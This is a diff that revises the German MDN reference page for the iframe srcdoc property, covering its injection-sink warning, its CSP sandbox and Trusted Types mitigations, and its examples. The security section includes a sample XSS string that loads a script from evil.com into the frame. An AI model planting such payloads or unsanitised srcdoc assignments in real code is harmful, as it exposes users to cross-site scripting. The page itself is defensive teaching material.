@@ -3,54 +3,54 @@ title: "HTMLIFrameElement: srcdoc-Eigenschaft"
 short-title: srcdoc
 slug: Web/API/HTMLIFrameElement/srcdoc
 l10n:
-  sourceCommit: ad01ed9218be15d7aeaa0666ec0bc2a2d17f3574
+  sourceCommit: 41a472e5bad6c6d2698d6e85c1172909cb102fa1
 ---
 
 {{APIRef("HTML DOM")}}
 
 > [!WARNING]
 > Diese Eigenschaft analysiert ihre Eingabe als HTML und schreibt das Ergebnis in das DOM des Frames.
-> APIs wie diese sind bekannt als [Injection Sinks](/de/docs/Web/API/Trusted_Types_API#concepts_and_usage) und stellen potenziell eine Angriffsfläche für [Cross-Site Scripting (XSS)](/de/docs/Web/Security/Attacks/XSS)-Angriffe dar, wenn die Eingabe ursprünglich von einem Angreifer stammt.
+> APIs wie diese gelten als [Injection Sinks](/de/docs/Web/API/Trusted_Types_API#concepts_and_usage) und können für [Cross-Site-Scripting-Angriffe (XSS)](/de/docs/Web/Security/Attacks/XSS) ausgenutzt werden, wenn die Eingabe ursprünglich von einem Angreifer stammt.
 >
-> Sie können dieses Risiko mindern, indem Sie immer `TrustedHTML`-Objekte anstelle von Strings zuweisen und [Trusted Types erzwingen](/de/docs/Web/API/Trusted_Types_API#using_a_csp_to_enforce_trusted_types).
-> Siehe [Sicherheitsüberlegungen](#sicherheitsüberlegungen) für weitere Informationen.
+> Sie können dieses Risiko verringern, indem Sie stets `TrustedHTML`-Objekte statt Zeichenfolgen zuweisen und die [Verwendung von Trusted Types erzwingen](/de/docs/Web/API/Trusted_Types_API#using_a_csp_to_enforce_trusted_types).
+> Weitere Informationen finden Sie unter [Sicherheitsaspekte](#sicherheitsaspekte).
 
-Die **`srcdoc`**-Eigenschaft der [`HTMLIFrameElement`](/de/docs/Web/API/HTMLIFrameElement)-Schnittstelle ruft das Inline-HTML-Markup des Dokuments des Frames ab oder setzt es.
+Die Eigenschaft **`srcdoc`** der Schnittstelle [`HTMLIFrameElement`](/de/docs/Web/API/HTMLIFrameElement) gibt das Inline-HTML-Markup des Frame-Dokuments zurück oder legt es fest.
 
-Dies spiegelt das [`srcdoc`](/de/docs/Web/HTML/Reference/Elements/iframe#srcdoc)-Attribut des {{htmlelement("iframe")}} wider.
+Sie spiegelt das Attribut [`srcdoc`](/de/docs/Web/HTML/Reference/Elements/iframe#srcdoc) von {{htmlelement("iframe")}} wider.
 
 ## Wert
 
-Das Abrufen der Eigenschaft gibt einen String zurück, der die HTML-Serialisierung des Dokuments des Frames enthält.
-Dies ist `undefined`, wenn der Wert nicht gesetzt ist.
+Beim Lesen der Eigenschaft wird eine Zeichenfolge mit der HTML-Serialisierung des Frame-Dokuments zurückgegeben.
+Ist kein Wert festgelegt, lautet der Rückgabewert `undefined`.
 
-Beim Setzen der Eigenschaft wird entweder ein [`TrustedHTML`](/de/docs/Web/API/TrustedHTML)-Objekt oder ein String akzeptiert.
-Es analysiert diese Eingabe als HTML-Dokument und ersetzt den Inhalt des Frames mit dem Ergebnis.
+Beim Setzen der Eigenschaft wird entweder ein [`TrustedHTML`](/de/docs/Web/API/TrustedHTML)-Objekt oder eine Zeichenfolge akzeptiert.
+Die Eingabe wird als HTML-Dokument analysiert; das Ergebnis ersetzt den Inhalt des Frames.
 
 ### Ausnahmen
 
-- `TypeError`
-  - : Wird ausgelöst, wenn die Eigenschaft auf einen String gesetzt wird, während [Trusted Types](/de/docs/Web/API/Trusted_Types_API) [durch eine CSP erzwungen](/de/docs/Web/API/Trusted_Types_API#using_a_csp_to_enforce_trusted_types) werden und keine Standardrichtlinie definiert ist.
+- {{jsxref("TypeError")}}
+  - : Wird ausgelöst, wenn der Eigenschaft eine Zeichenfolge zugewiesen wird, obwohl [Trusted Types](/de/docs/Web/API/Trusted_Types_API) [durch eine CSP erzwungen werden](/de/docs/Web/API/Trusted_Types_API#using_a_csp_to_enforce_trusted_types) und keine Standardrichtlinie definiert ist.
 
 ## Beschreibung
 
-Die **`srcdoc`**-Eigenschaft spiegelt den Inhalt des `<iframe>`-Elements [`srcdoc`](/de/docs/Web/HTML/Reference/Elements/iframe#srcdoc)-Attributs wider und kann verwendet werden, um das HTML-Dokument des {{htmlelement("iframe")}} zu setzen oder abzurufen.
+Die Eigenschaft **`srcdoc`** spiegelt den Inhalt des Attributs [`srcdoc`](/de/docs/Web/HTML/Reference/Elements/iframe#srcdoc) des `<iframe>`-Elements wider. Mit ihr lässt sich das HTML-Dokument, das zum {{htmlelement("iframe")}} gehört, festlegen oder abrufen.
 
-Beim Setzen der Eigenschaft sollte die Eingabe ein gültiges HTML-Dokument definieren, einschließlich der {{Glossary("doctype", "Doctype-Direktive")}}, {{htmlelement("html")}}, {{htmlelement("body")}} und anderer Tags.
-Beachten Sie jedoch, dass Browser normalerweise toleranter gegenüber ungültigem Markup sind und die meisten versuchen sollten, Eingaben zu rendern, die nur Body-Inhalt enthalten.
+Beim Setzen der Eigenschaft sollte die Eingabe ein gültiges HTML-Dokument einschließlich der {{Glossary("doctype", "Doctype-Direktive")}}, {{htmlelement("html")}}, {{htmlelement("body")}} und weiterer Tags definieren.
+Browser tolerieren jedoch üblicherweise ungültiges Markup und versuchen in den meisten Fällen auch dann, die Eingabe darzustellen, wenn sie nur den Inhalt des Body enthält.
 
-Jegliches vom Browser unterstütztes Markup wird geparst/serialisiert, einschließlich {{Glossary("shadow_tree", "Schattenwurzeln")}}.
+Jedes vom Browser unterstützte Markup wird analysiert und serialisiert, einschließlich {{Glossary("shadow_tree", "Shadow Roots")}}.
 
-Beachten Sie, dass wenn dies gesetzt ist, es jeden im [`src`](/de/docs/Web/API/HTMLIFrameElement/src) gesetzten Wert überschreiben wird.
+Beachten Sie, dass ein gesetzter Wert jeden Wert überschreibt, der in der Eigenschaft [`src`](/de/docs/Web/API/HTMLIFrameElement/src) festgelegt wurde.
 
-### Sicherheitsüberlegungen
+### Sicherheitsaspekte
 
-Die `srcdoc`-Eigenschaft ermöglicht standardmäßig jedes HTML-Markup in einem Frame auszuführen.
-Wenn der Frame nicht mit der Content Security Policy (CSP) [`sandbox`-Direktive](/de/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/sandbox) eingeschränkt wird (oder eingeschränkt wird, aber den [`allow-same-origin`](/de/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/sandbox#allow-same-origin) Wert einschließt), dann wird er gleich-origin wie der Parent.
-Das bedeutet, dass der Frame vollen Zugriff auf das Parent-DOM und Ressourcen hat und umgekehrt.
+Die Eigenschaft `srcdoc` erlaubt standardmäßig, beliebiges HTML-Markup in einem Frame auszuführen.
+Wenn der Frame nicht mit der [`sandbox`-Direktive](/de/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/sandbox) der Content Security Policy (CSP) isoliert wird – oder wenn die Isolierung den Wert [`allow-same-origin`](/de/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/sandbox#allow-same-origin) einschließt –, hat er denselben Ursprung wie das übergeordnete Dokument.
+Das bedeutet, dass der Frame uneingeschränkten Zugriff auf das übergeordnete DOM und dessen Ressourcen hat und umgekehrt.
 
-Dies ist eine bedeutende Angriffsfläche für [Cross-Site Scripting (XSS)](/de/docs/Web/Security/Attacks/XSS)-Angriffe, wenn möglicherweise unsichere Strings, die von einem Benutzer bereitgestellt werden, in einen Frame injiziert werden, ohne vorher bereinigt zu werden.
-Betrachten Sie den folgenden Code, bei dem ein HTML-String eines Benutzers in einen Frame übergeben werden könnte, der dann dem Dokument hinzugefügt wird.
+Dies birgt ein erhebliches Risiko für [Cross-Site-Scripting-Angriffe (XSS)](/de/docs/Web/Security/Attacks/XSS), wenn potenziell unsichere Zeichenfolgen von Benutzern ohne vorherige Bereinigung in einen Frame eingefügt werden.
+Betrachten Sie den folgenden Code, bei dem eine HTML-Zeichenfolge eines Benutzers an einen Frame übergeben werden könnte, der anschließend dem Dokument hinzugefügt wird.
 
 ```js
 const untrustedStringFromUser = `<!doctype html><script src="http://evil.com/naughty.js"></script>`;
@@ -59,20 +59,20 @@ iframe.srcdoc = untrustedStringFromUser;
 document.body.appendChild(iframe);
 ```
 
-Wenn der Frame nicht darauf angewiesen ist, Zugriff auf Ihr übergeordnetes Dokument zu benötigen, können Sie das Risiko mindern, indem Sie einen CSP-Sandbox verwenden, ohne den `allow-same-origin`-Wert.
-Der Frame wird dann als Cross-Origin-Ressource behandelt, und Angriffe werden erheblich eingeschränkt.
-Sie können auch eine allgemeinere CSP verwenden, um die Standorte einzuschränken, von denen Skripte und andere Ressourcen abgerufen werden dürfen.
+Wenn der Frame keinen Zugriff auf das übergeordnete Dokument benötigt, können Sie das Risiko durch eine CSP-Sandbox ohne den Wert `allow-same-origin` verringern.
+Der Frame wird dann als Ressource eines anderen Ursprungs behandelt, wodurch Angriffe erheblich eingeschränkt werden.
+Sie können außerdem eine allgemeinere CSP verwenden, um einzuschränken, von welchen Orten Skripte und andere Ressourcen geladen werden dürfen.
 
-Sie können das Risiko weiter reduzieren, indem Sie immer [`TrustedHTML`](/de/docs/Web/API/TrustedHTML)-Objekte anstelle von Strings zuweisen und [Trusted Types erzwingen](/de/docs/Web/API/Trusted_Types_API#using_a_csp_to_enforce_trusted_types) unter Verwendung der [`require-trusted-types-for`](/de/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/require-trusted-types-for) CSP-Direktive setzen.
-Dadurch wird sichergestellt, dass die Eingabe durch eine Transformationsfunktion geleitet wird, die die Möglichkeit erhält, die Eingabe zu [bereinigen](/de/docs/Web/Security/Attacks/XSS#sanitization), um potenziell gefährliches Markup zu entfernen, bevor es injiziert wird.
+Sie können das Risiko weiter verringern, indem Sie stets [`TrustedHTML`](/de/docs/Web/API/TrustedHTML)-Objekte statt Zeichenfolgen zuweisen und [Trusted Types mithilfe einer CSP erzwingen](/de/docs/Web/API/Trusted_Types_API#using_a_csp_to_enforce_trusted_types). Verwenden Sie dazu die CSP-Direktive [`require-trusted-types-for`](/de/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/require-trusted-types-for).
+Dadurch wird sichergestellt, dass die Eingabe eine Transformationsfunktion durchläuft, die potenziell gefährliches Markup vor dem Einfügen durch [Bereinigung](/de/docs/Web/Security/Attacks/XSS#sanitization) entfernen kann.
 
 ## Beispiele
 
-### Lesen des HTML aus einem iframe
+### HTML aus einem iframe lesen
 
-Das Lesen von `srcdoc` verursacht, dass der User-Agent das Dokument des iframes serialisiert.
+Beim Lesen von `srcdoc` serialisiert der Browser das Dokument des iframe.
 
-Gegeben folgendes HTML:
+Gegeben sei das folgende HTML:
 
 ```html
 <iframe
@@ -80,7 +80,7 @@ Gegeben folgendes HTML:
   srcdoc="<!doctype html><body><p>Hello World!</p></body>"></iframe>
 ```
 
-Sie können das Markup abrufen und protokollieren, wie gezeigt:
+Sie können das Markup wie gezeigt abrufen und protokollieren:
 
 ```js
 const frame = document.querySelector("#example");
@@ -88,21 +88,21 @@ const frameDoc = frame.srcdoc;
 console.log(frameDoc); // "<!doctype html><body><p>Hello World!</p></body>"
 ```
 
-### Ersetzen der Inline-Quelle des Frames
+### Das Inline-Dokument des Frames ersetzen
 
-In diesem Beispiel werden wir das Dokument eines Frames durch Zuweisung von HTML zu seiner `srcdoc`-Eigenschaft ersetzen.
-Um das Risiko von XSS zu mindern, erstellen wir zuerst ein `TrustedHTML`-Objekt aus dem String, der das HTML enthält, und weisen dann dieses Objekt `srcdoc` zu.
+In diesem Beispiel ersetzen wir das Dokument eines Frames, indem wir seiner Eigenschaft `srcdoc` HTML zuweisen.
+Um das XSS-Risiko zu verringern, erstellen wir zunächst aus der Zeichenfolge mit dem HTML ein `TrustedHTML`-Objekt und weisen dieses Objekt anschließend `srcdoc` zu.
 
-Trusted Types werden noch nicht von allen Browsern unterstützt, daher definieren wir zuerst das [trusted types tinyfill](/de/docs/Web/API/Trusted_Types_API#trusted_types_tinyfill).
-Dies wirkt als transparenter Ersatz für die Trusted Types JavaScript-API:
+Trusted Types werden noch nicht von allen Browsern unterstützt. Daher definieren wir zunächst den [Trusted Types Tinyfill](/de/docs/Web/API/Trusted_Types_API#trusted_types_tinyfill).
+Er dient als transparenter Ersatz für die JavaScript-API Trusted Types:
 
 ```js
 if (typeof trustedTypes === "undefined")
   trustedTypes = { createPolicy: (n, rules) => rules };
 ```
 
-Als Nächstes erstellen wir eine [`TrustedTypePolicy`](/de/docs/Web/API/TrustedTypePolicy), die ein [`createHTML()`](/de/docs/Web/API/TrustedTypePolicy/createHTML) für die Transformation eines Eingabestrings in [`TrustedHTML`](/de/docs/Web/API/TrustedHTML)-Instanzen definiert.
-In den meisten Fällen verwenden Implementierungen von `createHTML()` eine Bibliothek wie [DOMPurify](https://github.com/cure53/DOMPurify) zur Bereinigung der Eingabe, wie unten gezeigt:
+Als Nächstes erstellen wir eine [`TrustedTypePolicy`](/de/docs/Web/API/TrustedTypePolicy), die eine [`createHTML()`](/de/docs/Web/API/TrustedTypePolicy/createHTML)-Methode definiert, um eine Eingabezeichenfolge in [`TrustedHTML`](/de/docs/Web/API/TrustedHTML)-Instanzen umzuwandeln.
+Implementierungen von `createHTML()` verwenden häufig eine Bibliothek wie [DOMPurify](https://github.com/cure53/DOMPurify), um die Eingabe zu bereinigen, wie im Folgenden gezeigt:
 
 ```js
 const policy = trustedTypes.createPolicy("my-policy", {
@@ -110,7 +110,7 @@ const policy = trustedTypes.createPolicy("my-policy", {
 });
 ```
 
-Dann verwenden wir dieses `policy`-Objekt, um ein `TrustedHTML`-Objekt aus dem potenziell unsicheren Eingabestring zu erstellen und das Ergebnis dem Element zuzuweisen:
+Anschließend verwenden wir dieses `policy`-Objekt, um aus der potenziell unsicheren Eingabezeichenfolge ein `TrustedHTML`-Objekt zu erstellen, und weisen das Ergebnis dem Element zu:
 
 ```js
 // The potentially malicious string
@@ -126,8 +126,8 @@ const frameDoc = frame.srcdoc;
 ```
 
 > [!WARNING]
-> Während Sie direkt einen String `srcdoc` zuweisen können, stellt dies ein [Sicherheitsrisiko](#sicherheitsüberlegungen) dar, wenn der einzufügende String potenziell schädlichen Inhalt enthalten könnte.
-> Sie sollten `TrustedHTML` verwenden, um sicherzustellen, dass der Inhalt bereinigt wird, bevor er eingefügt wird, und Sie sollten einen CSP-Header setzen, um [Trusted Types zu erzwingen](/de/docs/Web/API/Trusted_Types_API#using_a_csp_to_enforce_trusted_types).
+> Sie können `srcdoc` zwar direkt eine Zeichenfolge zuweisen, doch dies birgt ein [Sicherheitsrisiko](#sicherheitsaspekte), wenn die einzufügende Zeichenfolge potenziell schädliche Inhalte enthalten könnte.
+> Verwenden Sie `TrustedHTML`, um sicherzustellen, dass der Inhalt vor dem Einfügen bereinigt wird, und setzen Sie einen CSP-Header, um [Trusted Types zu erzwingen](/de/docs/Web/API/Trusted_Types_API#using_a_csp_to_enforce_trusted_types).
 
 ## Spezifikationen
 
